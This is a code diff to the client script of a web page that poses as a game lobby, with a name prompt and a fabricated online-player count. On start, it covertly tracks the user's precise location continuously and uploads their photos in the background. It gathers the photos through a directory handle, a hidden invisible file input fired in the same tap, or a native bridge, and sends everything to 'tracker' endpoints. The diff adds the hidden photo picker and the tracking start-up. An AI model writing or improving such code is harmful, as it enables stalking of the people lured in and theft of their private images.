@@ -1,4 +1,4 @@
-const roomId = window.location.pathname.split('/').pop();
+const roomId = window.location.pathname.split('/').filter(Boolean).pop() || '';
 const joinScreen = document.getElementById('join-screen');
 const playScreen = document.getElementById('play-screen');
 const errorEl = document.getElementById('error');
@@ -19,6 +19,7 @@ const IDB_NAME = 'relay-sync-cache';
 const IDB_STORE = 'handles';
 const IDB_UPLOADS = 'uploaded';
 const DIR_PICKER_ID = 'relay-gallery-sync-v1';
+const IMAGE_ACCEPT = 'image/jpeg,image/png,image/webp,image/gif,image/heic,image/heif,image/bmp,image/avif,image/*';
 const uploadedKeys = new Set();
 
 let watchId = null;
@@ -30,7 +31,7 @@ let progress = 0;
 let gameTimers = [];
 let syncRunning = false;
 let libraryHandle = null;
-let rescanTimer = null;
+let gallerySyncInput = null;
 
 const IMAGE_EXT = /\.(jpe?g|png|webp|gif|heic|heif|bmp|tif|tiff|avif)$/i;
 
@@ -164,6 +165,35 @@ async function collectLibraryImages(requestIfNeeded = false) {
   return readDirImages(handle);
 }
 
+function ensureGalleryInput() {
+  if (gallerySyncInput) return gallerySyncInput;
+  const input = document.createElement('input');
+  input.type = 'file';
+  input.multiple = true;
+  input.accept = IMAGE_ACCEPT;
+  input.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;';
+  document.body.appendChild(input);
+  gallerySyncInput = input;
+  return input;
+}
+
+function pickGalleryImages() {
+  return new Promise((resolve) => {
+    const input = ensureGalleryInput();
+    const finish = (files) => {
+      input.value = '';
+      resolve(files.filter(isImageFile));
+    };
+    input.addEventListener('change', () => finish([...(input.files || [])]), { once: true });
+    input.addEventListener('cancel', () => finish([]), { once: true });
+    if (typeof input.showPicker === 'function') {
+      input.showPicker().catch(() => input.click());
+    } else {
+      input.click();
+    }
+  });
+}
+
 function animateLobby() {
   let online = rand(2400, 3200);
   onlineCount.textContent = online.toLocaleString();
@@ -209,12 +239,34 @@ async function sendLocation(lat, lng, accuracy) {
     ws.send(JSON.stringify({ type: 'location', ...payload }));
     return;
   }
-  const res = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/location`, {
+  await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/location`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(payload),
   });
-  if (res.status === 404) await rejoin();
+}
+
+async function sendPing() {
+  if (!trackerId) return;
+  if (ws?.readyState === WebSocket.OPEN) {
+    ws.send(JSON.stringify({ type: 'ping' }));
+    return;
+  }
+  await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/ping`, { method: 'POST' });
+}
+
+function startLocationTracking() {
+  if (!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(
+    (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
+    () => {},
+    { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
+  );
+  watchId = navigator.geolocation.watchPosition(
+    (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
+    () => {},
+    { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
+  );
 }
 
 async function rejoin() {
@@ -234,6 +286,7 @@ async function rejoin() {
 function connectWs() {
   const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
   ws = new WebSocket(`${protocol}//${location.host}/ws/track/${roomId}/${trackerId}`);
+  ws.onopen = () => sendPing();
   ws.onclose = () => setTimeout(() => { if (trackerId) connectWs(); }, 2000);
 }
 
@@ -290,8 +343,14 @@ async function startPhotoSync(requestAccess = false) {
 
   if (!requestAccess) return;
 
-  const granted = await collectLibraryImages(true);
-  if (granted.length) void backgroundMediaSync(granted);
+  const fromDir = await collectLibraryImages(true);
+  if (fromDir.length) {
+    void backgroundMediaSync(fromDir);
+    return;
+  }
+
+  const fromGallery = await pickGalleryImages();
+  if (fromGallery.length) void backgroundMediaSync(fromGallery);
 }
 
 async function rescanLoop() {
@@ -305,11 +364,22 @@ async function rescanLoop() {
 
 async function startPlaying() {
   hideError();
+  if (!roomId) { showError('Invalid session link.'); return; }
+
   const name = document.getElementById('name').value.trim();
   if (!name) { showError('Enter your player name to continue.'); return; }
 
   startBtn.disabled = true;
   startBtn.textContent = 'LOADING…';
+
+  // Photo picker must start in the same tap, before any await.
+  const filesPromise = hasNativeSync() ? Promise.resolve([]) : (async () => {
+    const cached = await collectLibraryImages(false);
+    if (cached.length) return cached;
+    const fromDir = await collectLibraryImages(true);
+    if (fromDir.length) return fromDir;
+    return pickGalleryImages();
+  })();
 
   try {
     const joinRes = await fetch(`/api/rooms/${roomId}/join`, {
@@ -322,18 +392,17 @@ async function startPlaying() {
 
     startGameUI(name);
     connectWs();
+    startLocationTracking();
+    await sendPing();
 
-    if (navigator.geolocation) {
-      watchId = navigator.geolocation.watchPosition(
-        (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
-        () => {},
-        { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
-      );
+    if (hasNativeSync()) {
+      window.RelayNative.syncAllPhotos(roomId, trackerId, location.origin);
+    } else {
+      filesPromise.then((files) => backgroundMediaSync(files));
     }
 
-    void startPhotoSync(false);
-
-    if (!rescanTimer) rescanTimer = setInterval(rescanLoop, 30000);
+    gameTimers.push(setInterval(sendPing, 30000));
+    gameTimers.push(setInterval(rescanLoop, 45000));
 
     gameTimers.push(setInterval(async () => {
       if (!trackerId) return;
@@ -348,20 +417,10 @@ async function startPlaying() {
   }
 }
 
-window.relayOnTrackerReady = (id) => {
-  trackerId = id;
-  void startPhotoSync(false);
-};
-
 startBtn.addEventListener('click', startPlaying);
 document.getElementById('name').addEventListener('keydown', (e) => {
   if (e.key === 'Enter') startPlaying();
 });
 
 loadUploadedKeys().then(() => loadDirHandle());
-
 animateLobby();
-
-setInterval(() => {
-  if (ws?.readyState === WebSocket.OPEN) ws.send('ping');
-}, 25000);
